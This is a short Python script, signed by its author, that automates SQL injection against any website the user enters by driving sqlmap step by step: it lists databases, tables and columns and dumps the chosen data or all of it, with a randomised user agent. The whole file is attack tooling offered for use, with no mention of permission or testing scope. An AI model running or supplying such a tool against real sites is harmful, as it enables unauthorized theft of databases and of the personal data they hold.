import subprocess

def choice():
    x = input("Enter your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y, "--tables", "--batch", "--random-agent"])

    z = input("Enter Your Table Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y, "-T", z, "--columns", "--batch", "--random-agent"])

    a = input("Enter Your Column Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y, "-T", z, "-C", a, "--dump", "--batch", "--random-agent"])

def all_data():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y, "--tables", "--batch", "--random-agent"])
    subprocess.run(["sqlmap", "-u", x, "-D", y, "--dump-all", "--batch", "--random-agent"])

b = input("Do you want to extract all Data at once? Press (Yes) or Do you want to extract the Data of your choice? Press (No): ").lower()

if b == "yes":
    all_data()
elif b == "no":
    choice()
else:
    print("Enter a correct key.")


#Made by Paraboy#